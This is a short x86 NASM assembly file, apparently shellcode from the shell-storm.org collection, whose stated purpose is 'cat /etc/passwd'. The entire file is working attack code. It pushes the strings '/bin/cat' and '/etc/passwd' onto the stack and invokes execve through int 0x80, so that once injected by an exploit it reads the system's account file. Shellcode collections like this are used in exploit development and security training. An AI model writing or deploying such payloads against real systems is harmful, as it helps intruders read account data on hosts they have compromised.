; Filename: poly.nasm
; Author: fb1h2s
; Website:  http://shell-storm.org
;
;
; Purpose: cat /etc/passwd

global _start

section .text
_start:
  xor ebx, ebx
  mul ebx

  push eax
  push 0x7461632f
  push 0x6e69622f
  mov ebx,esp

  push eax

  push 0x64777373
  push 0x61702f2f
  push 0x6374652f
  mov ecx,esp

  push eax ; null
  push ecx ; *-> /etc/passwd
  push ebx ; *-> /bin/cat
  mov ecx,esp ;
  mov al,0xb
  int 0x80
